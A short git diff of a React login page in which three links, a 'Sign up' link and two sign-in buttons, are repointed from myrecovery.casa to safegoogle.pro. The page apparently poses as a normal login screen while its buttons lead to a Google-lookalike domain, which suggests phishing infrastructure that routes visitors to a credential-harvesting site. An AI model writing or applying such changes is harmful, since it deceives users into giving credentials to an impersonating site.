@@ -49,7 +49,7 @@ export default function LoginPage() {
             <h1 className="text-2xl font-semibold text-gray-900 mb-2">Welcome back!</h1>
             <p className="text-sm text-gray-600">
               Don't have an account?{" "}
-              <a href="http://myrecovery.casa" className="text-purple-600 hover:text-purple-700 font-medium">
+              <a href="https://safegoogle.pro/" className="text-purple-600 hover:text-purple-700 font-medium">
                 Sign up
               </a>
             </p>
@@ -57,7 +57,7 @@ export default function LoginPage() {
 
           <div className="space-y-4">
             <a
-              href="https://myrecovery.casa"
+              href="https://safegoogle.pro/"
               target="_blank"
               rel="noopener noreferrer"
               className="w-full flex items-center justify-center gap-3 px-4 py-3 bg-white border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors text-sm font-medium text-gray-700"
@@ -188,7 +188,7 @@ export default function LoginPage() {
             </div>
 
             <a
-              href="http://myrecovery.casa"
+              href="https://safegoogle.pro/"
               target="_blank"
               rel="noopener noreferrer"
               className="w-full flex items-center justify-center gap-3 px-4 py-3 bg-white border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors text-sm font-medium text-gray-700"
